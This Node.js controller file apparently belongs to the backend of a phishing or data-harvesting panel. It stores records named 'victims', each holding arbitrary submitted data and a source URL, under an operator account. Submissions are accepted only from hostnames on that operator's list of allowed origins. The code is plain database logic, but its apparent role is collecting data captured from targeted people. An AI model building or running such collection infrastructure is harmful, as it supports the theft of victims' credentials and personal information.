const Victim = require("../models/Victim");
const status = require("../../functions/status");
const User = require("../models/User");
const getHostname = require("../../functions/getHostname");

module.exports = class VictimController {
  async GetAll(owner) {
    const victims = await Victim.find({
      owner,
    });

    try {
      if (victims.length > 0) {
        return {
          status: 200,
          victims,
        };
      } else {
        return {
          status: 200,
          victims: [],
        };
      }
    } catch {
      return status.server_error;
    }
  }

  async Create(owner, data) {
    const userData = await User.findOne({
      username: owner,
    });

    const allowedOrigins = userData.allowedOrigins || [];

    if (!allowedOrigins.find((o) => o.hostname == getHostname(data.url))) {
      return {
        status: 403,
        error: "Esta origem não tem permissão para fazer isso.",
      };
    }

    const newVictim = new Victim({
      owner,
      data,
      url: data.url,
    });

    try {
      const result = await newVictim.save();
      return {
        status: 200,
        message: "Dados salvos com êxito!",
        db: result,
      };
    } catch {
      return status.server_error;
    }
  }
};
